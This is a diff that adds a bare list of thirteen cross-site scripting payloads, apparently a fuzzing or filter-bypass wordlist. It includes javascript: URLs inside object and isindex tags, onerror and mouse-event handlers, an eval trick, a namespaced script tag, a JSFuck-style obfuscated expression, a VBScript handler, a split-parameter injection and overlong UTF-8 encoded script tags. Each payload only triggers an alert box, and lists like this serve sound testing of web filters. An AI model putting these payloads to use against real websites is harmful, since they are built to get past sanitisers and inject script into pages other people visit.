@@ -1,0 +1,13 @@
+<img/src="mars.png"alt="mars"> 
+<object><param name="src" value="javascript:alert(0)"></param></object> 
+<object data="javascript:alert(0)"> 
+<isindex type=image src=1 onerror=alert(1)> 
+<isindex action=javascript:alert(1) type=image> 
+<img src=x:alert(alt) onerror=eval(src) alt=0> 
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert('xss');</x:script> 
+location='javascript:alert(0)'; 
+(É=[Å=[],µ=!Å+Å][µ[È=-~-~++Å]+({}+Å) [Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])() [µ[Å]+µ[Å+Å]+Ç[È]+ª](Å)
+<b/alt="1"onmouseover=InputBox+1language=vbs>test</b>
+</a onmousemove="alert(1)">
+?injection=<script+&injection=>alert(1)></script>
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
